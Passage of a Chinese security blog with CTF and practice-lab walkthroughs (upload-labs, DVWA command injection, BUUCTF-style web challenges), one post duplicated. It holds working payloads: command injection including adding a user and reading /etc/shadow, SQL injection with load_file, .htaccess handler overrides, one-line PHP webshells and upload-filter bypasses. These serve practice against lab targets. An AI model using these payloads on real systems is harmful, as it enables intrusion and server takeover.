-<pre><code>      构造 /?ip=127.0.0.1;cat$IFS$9`ls`
-
-      注：内联，就是将反引号内命令的输出作为输入执行。
-
-      什么正则都是浮云，可能这就是大佬的世界吧。
-</code></pre>
-<p><strong>[ACTF2020 新生赛]Exec 1</strong> 一个命令行注入 需要cat指令用来打开东西  就ls列出他的文件来 用几个../ 就能找到有flag的地方</p>
-<p><strong>[护网杯 2018]easy_tornado1</strong>  这个用的是tornado的服务器框架 hints那边有个提示md5(cookie_secret+md5(filename))  file?filename=/hints.txt&amp;filehash=96981af0012f04a22b942f5bf957f7ef所以后面这串hash应该是这么来的<br>现在就是找出cookie_secret  tornado 框架的官网找一下cookie_secret在RequestHandler.application.settings里<br>用handler.settings访问RequestHandler.application.settings  然后payload   /error?msg= 得到cookie_secret 再flag那边得知fllllllllllllag 真flag在这 fllllllllllllag这个搞成MD5加密的然后和cookie_sceret组合一下MD5加密一波<br>file?filename=/fllllllllllllag.txt&amp;filehash=34e4c6c1748d183dd644a5f0e9290b37<br><strong>[RoarCTF 2019]Easy Calc 1</strong>     右键源码发现还有另一个php文件 叫calc.php      $_GET[‘num’] payload构造就是?num=1;var_dump(scandir(chr(47)))<br>var_dump()用来打印<br>scandir（）用来获取目录文件<br>chr（47）是 /的ASCII编码，因为 / 被过滤了，用这个什么都不显示。 var_dump(file_get_contents())  配合ASCII编码使用chr() 里头写入数字<br>再就是num前有个空格，用来绕过waf（web防火墙）（为什么是waf？）。<br>这是php的机制，在传进php代码的url时，一些字符会被忽略或变成_。<br>因为php一般是这样$_GET[‘num’]获取url传进来的参数,当有一些奇怪的字符和参数写在一些时，如%[num%id,它会变成$_GET[‘num_id’]。所以在num前加个空格可以绕过waf并且php会把它当成正常的num使用，此时并不是’ num’而是‘num’。<br>这个之前sqlilabs出现过就是那个号称拥有最强防火墙的<br>打开flagg这个 ? num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))<br>chr(47)——/<br>chr(102)——f<br>chr(49)——1<br>chr(97)——a<br>chr(103)——g<br>它们之间用.连接，因为是php。  就可以获取flag </p>
+<p>}<br>$a = new UserInfo(“aaad”,19,”file:///var/www/html/flag.php”);<br>var_dump(serialize($a));<br>?&gt;   构造这个然后复制一波 aaad 19 4399 这些是自己弄 要弄什么都可以 ?no=-1/<strong>/union/</strong>/select/<strong>/1,2,3,’O:8:”UserInfo”:3:{s:4:”name”;s:4:”aaad”;s:3:”age”;i:19;s:4:”blog”;s:29:”file:///var/www/html/flag.php”;}’  然后右键查看源码 有个data text 啥的<br>那段复制然后base64解码就可<br>或者因为sql注入没有过滤load_file直接取得flag<br>no=-1 union/</strong>/select 1,load_file(“/var/www/html/flag.php”),3,4<br><strong>[GXYCTF2019]BabySQli 1</strong>  union select 1，2，3   在这个关要构造假身份     利用sqli的特性：在联合查询并不存在的数据时，联合查询就会构造一个虚拟的数据。select * from ‘users’ where name=’person’ union select 1,’admin’,’e10adc3949ba59abbe56057f20f883e’,4,5    按照我们的输入，sqli在数据库中写入数据，相当于伪造了一个身份，就可以用这个身份登录了。<br>试探id username password 这三个的顺序如何 name=aaa’ union select ‘admin’,2 #&amp;pw=qqq   显示wrong user<br>name=aaa’ union select 1,’admin’,3 #&amp;pw=qqq 显示wrong password   然后把3 改成qqq的MD5加密形式就可以了<br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3674%EF%BC%88%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%89">https://xz.aliyun.com/t/3674（反序列化的一些知识点）</a><br><strong>[MRCTF2020]你传你🐎呢 1</strong><br><strong>&lt;FilesMatch “1.png”&gt;</strong><br><strong>SetHandler application/x-httpd-php</strong><br><strong></FilesMatch></strong>  传一个这样的.htaccess  这个是将1.png 默认成php   然后传一个1.png的后门文件就可以了<br><strong>[MRCTF2020]Ez_bypass 1</strong>又是一题MD5 比较的 那就数组绕过?gg[]=1&amp;id[]=2<br>然后post一个passwd=1234567a就可以了  因为  if($passwd==1234567)</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/05/03/page-43/" data-id="ckrosnluf000rmow785a9e301" data-title="刷题1" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-page-42" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/05/03/page-42/" class="article-date">
-  <time class="dt-published" datetime="2021-05-02T23:58:27.000Z" itemprop="datePublished">2021-05-03</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/05/03/page-42/">之前的uploadlabs的被安全卫士杀掉了</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="uploadlabs-1-9"><a href="#uploadlabs-1-9" class="headerlink" title="uploadlabs 1-9"></a>uploadlabs 1-9</h1><p>这次我们换个好玩的 uploadlabs 非常amazing</p>
-<p>用burp 和火狐 两个配合一下很快</p>
-<p>先写个一句话木马eval POST[‘’] 这个post[‘’] 框框里面的自己填什么都行<img src="https://img-blog.csdnimg.cn/20200716013408800.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xvc2VoZWFydDE1Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p><strong>第一关</strong>上传嘛 上传东西 刚才那个一句话木马先另存为格式为jpg 才过的去这关</p>
-<p>然后burp抓个包 改一下这个格式 .php 然后中国菜刀链接一下 <a target="_blank" rel="noopener" href="http://127.0.0.1/upload-labs/upload/.php">http://127.0.0.1/upload-labs/upload/.php</a> 1</p>
-<p>获取权限了就可以控制这电脑了</p>
-<p><strong>第二关</strong> 和第一关差不多只不过type要改成这边允许的类型’image/jpeg 或者 image/png’等等</p>
-<p>那还是老样子另存改个格式 之后抓包改为.php</p>
-<p><strong>第三关</strong>这回没法直接抓包改为.php了 稍稍微改一下 .php3 .phtml</p>
-<p>就把.php后面加个数字 但是得先去apache那边的配置文件添加一下</p>
-<p>配置文件打开找到一行addtype application/x-httpd-php .php .phtml .php3 .php4 就是把这类后缀的文件解析成php 老样子另存. jpg 之后上传时抓包改格式为.php3 然后菜刀连接一下就可以了 关于php3的介绍<img src="https://img-blog.csdnimg.cn/20200716102620257.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xvc2VoZWFydDE1Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20200716015655108.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xvc2VoZWFydDE1Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p><strong>第四关</strong>就太狠了把都给过滤掉了 用一个别的叫做htaccess</p>
-<p>.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置</p>
-<p>先创建一个.htaccess格式的文件 记事本打开写点东西进去</p>
-<p>SetHandler application/x-httpd-php 这串</p>
-<p>这样就可以把所有文件当成php执行</p>
-<p>burp抓包时改一下删掉名字就留下格式 然后把那个.jpg上传上去就可以了 菜刀一连就行了</p>
-<p><strong>第五关</strong> 没有之前的那样子{$file_ext = strtolower($file_ext); //转换为小写} 和前几关的源码对比发现少了这句</p>
-<p>那么就是说可以用大小写混合绕过去 结果是可以这么干</p>
-<p><strong>第六关</strong> $file_ext = trim($file_ext); //首尾去空 少了这句代码 那么就可以改一下burp截个包 改格式. php php前多个空格</p>
-<p>**第七关 **$file_name = deldot($file_name);//删除文件名末尾的点 少了这句代码那么上传时可以用.php. 绕过限制</p>
-<p><strong>第八关</strong> 首先来了解一个东西 ::D A T A : N T F S 文 件 系 统 包 括 对 备 用 数 据 流 的 支 持 。 主 要 包 括 提 供 与 M a c i n t o s h 文 件 系 统 中 的 文 件 的 兼 容 性 。 备 用 数 据 流 允 许 文 件 包 含 多 个 数 据 流 。 每 个 文 件 至 少 有 一 个 数 据 流 。 在 W i n d o w s 中 ， 此 默 认 数 据 流 称 为 ： DATA: NTFS文件系统包括对备用数据流的支持。主要包括提供与Macintosh文件系统中的文件的兼容性。备用数据流允许文件包含多个数据流。每个文件至少有一个数据流。在Windows中，此默认数据流称为：DATA:NTFS文件系统包括对备用数据流的支持。主要包括提供与Macintosh文件系统中的文件的兼容性。备用数据流允许文件包含多个数据流。每个文件至少有一个数据流。在Windows中，此默认数据流称为：<br>DATA。<br>简单讲就是在php+windows的情况下：如果文件名+”::D A T A “ 会 把 : : DATA”会把::DATA”会把::DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::$DATA”之前的文件名。 这关$file_ext = str_ireplace(‘::$DATA’, ‘’, $file_ext);//去除字符串::$DATA 少了这串代码 那么上传时在burp中这儿</p>
-<p>Content-Disposition: form-data; name=”upload_file”; filename=”yijuhua.jpg**::$DATA**”<br>Content-Type: image/jpeg</p>
-<p>首先标配嘛改格式 然后php后面加个::$DATA 就可以上传成功然后连接</p>
-<p><strong>第九关</strong> 认真看了下源码发现其实这些去头去末尾的操作好像是按顺序来的那么末尾多打几个东西说不定就能耗死这些代码┗|｀O′|┛ nice 那么就抓包改一下格式 .php. .. 然后居然可以上传成功 连接一下就可以了</p>
-<p>那按这么说前面那些也可以这么搞 卧槽┗|｀O′|┛ 嗷~~ <strong>真的可以1-9 都可以这样弄</strong>.php. .. (一个点一个空格两个点)</p>
-<p><strong>第十关</strong> 其实和第九差不多就这关用了替换函数</p>
-<p>双写绕过就可了 .pphphp (好像只能这么个格式)</p>
-<p><strong>第十一关</strong><a target="_blank" rel="noopener" href="https://i0.hdslb.com/bfs/article/6ef1f1d336cd189b0e721896a9b00ae8cb3e4514.png@1320w_772h.webp"><img src="https://i0.hdslb.com/bfs/article/6ef1f1d336cd189b0e721896a9b00ae8cb3e4514.png@1320w_772h.webp" alt="img"></a>img</p>
-<p>存在字符拼接 可以随意变换储存地址%00截断法<a target="_blank" rel="noopener" href="https://i0.hdslb.com/bfs/article/5568905ac6bb29a3afffd9b5f8a83e587ac3793f.png@1320w_640h.webp"><img src="https://i0.hdslb.com/bfs/article/5568905ac6bb29a3afffd9b5f8a83e587ac3793f.png@1320w_640h.webp" alt="img"></a></p>
-<p>burp中修改个地方 一个是POST那边 upload后面加个yl.php%00</p>
-<p>名字要和filename那边的不一样 然后就能上传成功了</p>
-<p><strong>第十二</strong> 这个<a target="_blank" rel="noopener" href="https://i0.hdslb.com/bfs/article/f1836471c13e53901d15f117cbe8c252690d2cc3.png@1320w_608h.webp"><img src="https://i0.hdslb.com/bfs/article/f1836471c13e53901d15f117cbe8c252690d2cc3.png@1320w_608h.webp" alt="img"></a></p>
-<p>变成post的方法 要在burp的十六进制那边改所以还挺麻烦的</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/05/03/page-42/" data-id="ckrosnluf000qmow7868u7cze" data-title="之前的uploadlabs的被安全卫士杀掉了" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-page-37" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/04/19/page-37/" class="article-date">
-  <time class="dt-published" datetime="2021-04-19T12:21:29.000Z" itemprop="datePublished">2021-04-19</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/04/19/page-37/">之前的uploadlabs的被安全卫士杀掉了</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="uploadlabs-1-9"><a href="#uploadlabs-1-9" class="headerlink" title="uploadlabs 1-9"></a>uploadlabs 1-9</h1><p>这次我们换个好玩的 uploadlabs 非常amazing</p>
-<p>用burp 和火狐 两个配合一下很快</p>
-<p>先写个一句话木马eval POST[‘’] 这个post[‘’] 框框里面的自己填什么都行<img src="https://img-blog.csdnimg.cn/20200716013408800.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xvc2VoZWFydDE1Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p><strong>第一关</strong>上传嘛 上传东西 刚才那个一句话木马先另存为格式为jpg 才过的去这关</p>
-<p>然后burp抓个包 改一下这个格式 .php 然后中国菜刀链接一下 <a target="_blank" rel="noopener" href="http://127.0.0.1/upload-labs/upload/.php">http://127.0.0.1/upload-labs/upload/.php</a> 1</p>
-<p>获取权限了就可以控制这电脑了</p>
-<p><strong>第二关</strong> 和第一关差不多只不过type要改成这边允许的类型’image/jpeg 或者 image/png’等等</p>
-<p>那还是老样子另存改个格式 之后抓包改为.php</p>
-<p><strong>第三关</strong>这回没法直接抓包改为.php了 稍稍微改一下 .php3 .phtml</p>
-<p>就把.php后面加个数字 但是得先去apache那边的配置文件添加一下</p>
-<p>配置文件打开找到一行addtype application/x-httpd-php .php .phtml .php3 .php4 就是把这类后缀的文件解析成php 老样子另存. jpg 之后上传时抓包改格式为.php3 然后菜刀连接一下就可以了 关于php3的介绍<img src="https://img-blog.csdnimg.cn/20200716102620257.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xvc2VoZWFydDE1Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20200716015655108.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xvc2VoZWFydDE1Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p><strong>第四关</strong>就太狠了把都给过滤掉了 用一个别的叫做htaccess</p>
-<p>.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置</p>
-<p>先创建一个.htaccess格式的文件 记事本打开写点东西进去</p>
-<p>SetHandler application/x-httpd-php 这串</p>
-<p>这样就可以把所有文件当成php执行</p>
-<p>burp抓包时改一下删掉名字就留下格式 然后把那个.jpg上传上去就可以了 菜刀一连就行了</p>
-<p><strong>第五关</strong> 没有之前的那样子{$file_ext = strtolower($file_ext); //转换为小写} 和前几关的源码对比发现少了这句</p>
-<p>那么就是说可以用大小写混合绕过去 结果是可以这么干</p>
-<p><strong>第六关</strong> $file_ext = trim($file_ext); //首尾去空 少了这句代码 那么就可以改一下burp截个包 改格式. php php前多个空格</p>
-<p>**第七关 **$file_name = deldot($file_name);//删除文件名末尾的点 少了这句代码那么上传时可以用.php. 绕过限制</p>
-<p><strong>第八关</strong> 首先来了解一个东西 ::D A T A : N T F S 文 件 系 统 包 括 对 备 用 数 据 流 的 支 持 。 主 要 包 括 提 供 与 M a c i n t o s h 文 件 系 统 中 的 文 件 的 兼 容 性 。 备 用 数 据 流 允 许 文 件 包 含 多 个 数 据 流 。 每 个 文 件 至 少 有 一 个 数 据 流 。 在 W i n d o w s 中 ， 此 默 认 数 据 流 称 为 ： DATA: NTFS文件系统包括对备用数据流的支持。主要包括提供与Macintosh文件系统中的文件的兼容性。备用数据流允许文件包含多个数据流。每个文件至少有一个数据流。在Windows中，此默认数据流称为：DATA:NTFS文件系统包括对备用数据流的支持。主要包括提供与Macintosh文件系统中的文件的兼容性。备用数据流允许文件包含多个数据流。每个文件至少有一个数据流。在Windows中，此默认数据流称为：<br>DATA。<br>简单讲就是在php+windows的情况下：如果文件名+”::D A T A “ 会 把 : : DATA”会把::DATA”会把::DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::$DATA”之前的文件名。 这关$file_ext = str_ireplace(‘::$DATA’, ‘’, $file_ext);//去除字符串::$DATA 少了这串代码 那么上传时在burp中这儿</p>
-<p>Content-Disposition: form-data; name=”upload_file”; filename=”yijuhua.jpg**::$DATA**”<br>Content-Type: image/jpeg</p>
-<p>首先标配嘛改格式 然后php后面加个::$DATA 就可以上传成功然后连接</p>
-<p><strong>第九关</strong> 认真看了下源码发现其实这些去头去末尾的操作好像是按顺序来的那么末尾多打几个东西说不定就能耗死这些代码┗|｀O′|┛ nice 那么就抓包改一下格式 .php. .. 然后居然可以上传成功 连接一下就可以了</p>
-<p>那按这么说前面那些也可以这么搞 卧槽┗|｀O′|┛ 嗷~~ <strong>真的可以1-9 都可以这样弄</strong>.php. .. (一个点一个空格两个点)</p>
-<p><strong>第十关</strong> 其实和第九差不多就这关用了替换函数</p>
-<p>双写绕过就可了 .pphphp (好像只能这么个格式)</p>
-<p><strong>第十一关</strong><a target="_blank" rel="noopener" href="https://i0.hdslb.com/bfs/article/6ef1f1d336cd189b0e721896a9b00ae8cb3e4514.png@1320w_772h.webp"><img src="https://i0.hdslb.com/bfs/article/6ef1f1d336cd189b0e721896a9b00ae8cb3e4514.png@1320w_772h.webp" alt="img"></a>img</p>
-<p>存在字符拼接 可以随意变换储存地址%00截断法<a target="_blank" rel="noopener" href="https://i0.hdslb.com/bfs/article/5568905ac6bb29a3afffd9b5f8a83e587ac3793f.png@1320w_640h.webp"><img src="https://i0.hdslb.com/bfs/article/5568905ac6bb29a3afffd9b5f8a83e587ac3793f.png@1320w_640h.webp" alt="img"></a></p>
-<p>burp中修改个地方 一个是POST那边 upload后面加个yl.php%00</p>
-<p>名字要和filename那边的不一样 然后就能上传成功了</p>
-<p><strong>第十二</strong> 这个<a target="_blank" rel="noopener" href="https://i0.hdslb.com/bfs/article/f1836471c13e53901d15f117cbe8c252690d2cc3.png@1320w_608h.webp"><img src="https://i0.hdslb.com/bfs/article/f1836471c13e53901d15f117cbe8c252690d2cc3.png@1320w_608h.webp" alt="img"></a></p>
-<p>变成post的方法 要在burp的十六进制那边改所以还挺麻烦的</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/04/19/page-37/" data-id="ckrosnlue000omow74kixd1t9" data-title="之前的uploadlabs的被安全卫士杀掉了" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-page-35" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/03/06/page-35/" class="article-date">
-  <time class="dt-published" datetime="2021-03-06T02:16:31.000Z" itemprop="datePublished">2021-03-06</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/03/06/page-35/">dvwa command injection</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>a这个就ping一个地址然后后面跟一些命令就能知道服务器的一些信息</p>
-<p>例如 127.0.0.1&amp;net user aaa/add  这样可以创建一个用户aaa</p>
-<p>&amp;&amp;、&amp;、||、| 这些可用作命令连接符使用 用户通过浏览器提交执行命令然后服务器这边就会执行</p>
-<p><strong>&amp;&amp; 用这个符号意味着 先执行前面的命令在执行后面的若第一条不执行第二条也不执行</strong></p>
-<p><strong>&amp; 不管第一条成功与否都执行第二条</strong></p>
-<p><strong>| 只执行第二条</strong></p>
-<p><strong>||第一条执行失败在执行第二条 第一条成功就不执行第二条</strong></p>
-<p><strong>whoami</strong> 查询服务器当前用户  <strong>ipconfig</strong> 网卡那些七七八八的 <strong>dir</strong> 后面再跟个那个盘目录之类的可以看到这个盘里头某个特定文件的大小或者盘目录里头的东西七七八八的  <strong>ls</strong> 列出当前文件夹内容  <strong>sleep 5</strong> 用来看是否存在时间差检测是否存在漏洞  **cat/etc/shadow ** 这个是linux系统的影子文件 </p>
-<p><strong>dvwa的low</strong>  这里头什么都没过滤直接码进去不管他 写什么都能执行</p>
-<p><strong>medium</strong> 这关吧&amp;&amp; ； 替换成了空格 但也能过 多打几个嘛 &amp;&amp;变成&amp;&amp;&amp; 或者&amp;；&amp;  （这样是吧；换成了空格然后帮了我们把这变成&amp;&amp;）</p>
-<p>或者毕竟之过滤&amp;&amp; 那么&amp;还是能运行的  </p>
-<p><strong>High</strong> </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> &#x27;&amp;&#x27;  =&gt; &#x27;&#x27;, </span><br><span class="line">&#x27;;&#x27;  =&gt; &#x27;&#x27;, </span><br><span class="line"></span><br><span class="line">&#x27;|  &#x27; =&gt; &#x27;&#x27;, </span><br><span class="line"></span><br><span class="line">&#x27;-&#x27;  =&gt; &#x27;&#x27;, </span><br><span class="line"></span><br><span class="line">&#x27;$&#x27;  =&gt; &#x27;&#x27;, </span><br><span class="line"></span><br><span class="line">&#x27;(&#x27;  =&gt; &#x27;&#x27;, </span><br><span class="line"></span><br><span class="line">&#x27;)&#x27;  =&gt; &#x27;&#x27;, </span><br><span class="line"></span><br><span class="line">&#x27;`&#x27;  =&gt; &#x27;&#x27;, </span><br><span class="line"></span><br><span class="line">&#x27;||&#x27; =&gt; &#x27;&#x27;,</span><br></pre></td></tr></table></figure>
-<p>好多都被过滤了 试一下用url编码 %20 =空格 %5c=\ %26=&amp; %7c=| （用不了）</p>
-<p>打好几个&amp; 不行 好几个| ┗|｀O′|┛ 嗷~~  居然可以 nice</p>
-<p> **impossible **  这个是魔鬼没办法的根本过不去 动不动就显示无效ip</p>
-<p>这关用了 stripslashes（$target） 删除字符串的反斜杠 返回已剥离反斜杠的字符串</p>
-<p>explode（”.”,$target） 这个直接把字符串打散成数组  </p>
-<p>explode(separator,string,limit)  separator(必须，规定从哪开始分割)  string（必须，需分割的字符串） limit（可选，规定返回的数组的数目）</p>
-<p>is_nummeric($target)  检测 $target是否为数字挥着数字字符串 </p>
-<p>还加入了Anti-CSRF token  对参数ip进行严格限制 例如只有数字.数字.数字.数字. 的输入才会接收</p>
-<p>那么完全不存在命令行注入了(╬▔皿▔)凸</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/03/06/page-35/" data-id="ckrosnlud000nmow7gie6443m" data-title="dvwa command injection" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-page-34" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/03/04/page-34/" class="article-date">
-  <time class="dt-published" datetime="2021-03-04T07:05:24.000Z" itemprop="datePublished">2021-03-04</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/03/04/page-34/">upload labs 17</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>这关叫做条件竞争 虚拟网卡好像是数据包速率问题反正没试成功过___*( ￣皿￣)/#____</p>
-<p>源码这边说后台先把文件保存进文件夹再判断后缀是否合法 </p>
-<p>那么多线程的情况下就可能出现文件文件夹的文件没处理完就直接绕过了防护</p>
-<p>先创建一个<?php                                                       ?>’);?&gt;</p>
-<p>代码为这个的php文件 意思是当访问这个之后就会创建一个shell2.php的文件并写入一句话木马<br><em>fopen()函数的用法</em><br><em>1、fopen() 函数打开一个文件或 URL。</em><br><em>2、如果 fopen() 失败，它将返回 FALSE 并附带错误信息。您可以通过在函数名前面添加一个 ‘@’ 来隐藏错误输出。</em><br><em>“r” （只读方式打开，将文件指针指向文件头）</em><br><em>“r+” （读写方式打开，将文件指针指向文件头）</em><br><em>“w” （写入方式打开，清除文件内容，如果文件不存在则尝试创建之）</em><br><em>“w+” （读写方式打开，清除文件内容，如果文件不存在则尝试创建之）</em><br><em>“a” （写入方式打开，将文件指针指向文件末尾进行写入，如果文件不存在则尝试创建之）</em><br><em>“a+” （读写方式打开，通过将文件指针指向文件末尾进行写入来保存文件内容）</em><br><em>“x” （创建一个新的文件并以写入方式打开，如果文件已存在则返回 FALSE 和一个错误）</em><br><em>“x+” （创建一个新的文件并以读写方式打开，如果文件已存在则返回 FALSE 和一个错误）</em></p>
-<p>burp抓包然后 send to intruder</p>
-<p>设置数据包无限重发 payloads那边 payload type选择null payloads 下面的 continue indefinitely选上  然后还要弄个python脚本来检测有没有上传上去</p>
-<p>import requests<br>url = “<a target="_blank" rel="noopener" href="http://127.0.0.1/upload-labs/upload/aaa.php&quot;">http://127.0.0.1/upload-labs/upload/aaa.php&quot;</a><br>while True:<br>    html = requests.get(url)<br>    if html.status_code == 200:<br>        print(“OK”)<br>        break<br>    else:<br>        print(“NO”)   **脚本代码 ** 如果访问的了就会显示ok 然后就会创建 shell.php 的文件</p>
-<p>burp attack之前就需要运行这个脚本 </p>
-<p>然后就可以连接了 菜刀开启</p>
-<p>也有不用python脚本的方法手动不断访问<a target="_blank" rel="noopener" href="http://127.0.0.1/upload-labs/upload/aaa.php">http://127.0.0.1/upload-labs/upload/aaa.php</a></p>
-<p>知道访问成功为止</p>
-<p>但是呢这我到现在都没成功</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/03/04/page-34/" data-id="ckrosnlud000mmow791mp5f8v" data-title="upload labs 17" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-page-33" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/03/01/page-33/" class="article-date">
-  <time class="dt-published" datetime="2021-03-01T14:29:00.000Z" itemprop="datePublished">2021-03-01</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/03/01/page-33/">十六看懂了</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <hr>
-<h2 id="前记"><a href="#前记" class="headerlink" title="前记"></a>前记</h2><p><a target="_blank" rel="noopener" href="https://github.com/c0ny1/upload-labs">upload-labs</a>,是一个关于文件上传的靶场.具体的write-up社区里也都有<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2435">文章</a>.<br>不过我在看了pass-16的源码后,发现了一些有意思的东西.</p>
-<h2 id="分析问题"><a href="#分析问题" class="headerlink" title="分析问题"></a>分析问题</h2><p>关于检测gif的代码</p>
-<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20180829084054-2fdf5136-ab24-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829084054-2fdf5136-ab24-1.png" alt="img"></a></p>
-<p>第71行检测<code>$fileext</code>和<code>$filetype</code>是否为gif格式.</p>
-<p>然后73行使用<code>move_uploaded_file</code>函数来做判断条件,如果成功将文件移动到<code>$target_path</code>,就会进入二次渲染的代码,反之上传失败.</p>
-<p>在这里有一个问题,如果作者是想考察绕过二次渲染的话,在<code>move_uploaded_file($tmpname,$target_path)</code>返回true的时候,就已经成功将图片马上传到服务器了,所以下面的二次渲染并不会影响到图片马的上传.如果是想考察文件后缀和<code>content-type</code>的话,那么二次渲染的代码就很多余.(到底考点在哪里,只有作者清楚.哈哈)</p>
-<p>由于在二次渲染时重新生成了文件名,所以可以根据上传后的文件名,来判断上传的图片是二次渲染后生成的图片还是直接由<code>move_uploaded_file</code>函数移动的图片.</p>
-<p>我看过的writeup都是直接由<code>move_uploaded_file</code>函数上传的图片马.今天我们把<code>move_uploaded_file</code>这个判断条件去除,然后尝试上传图片马.</p>
-<h2 id="上传gif"><a href="#上传gif" class="headerlink" title="上传gif"></a>上传gif</h2><p>将<code>&lt;?php phpinfo(); ?&gt;</code>添加到111.gif的尾部.</p>
-<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20180829084054-30088bb4-ab24-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829084054-30088bb4-ab24-1.png" alt="img"></a></p>
-<p>成功上传含有一句话的111.gif,但是这并没有成功.我们将上传的图片下载到本地.<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20180829084054-30124a96-ab24-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829084054-30124a96-ab24-1.png" alt="img"></a></p>
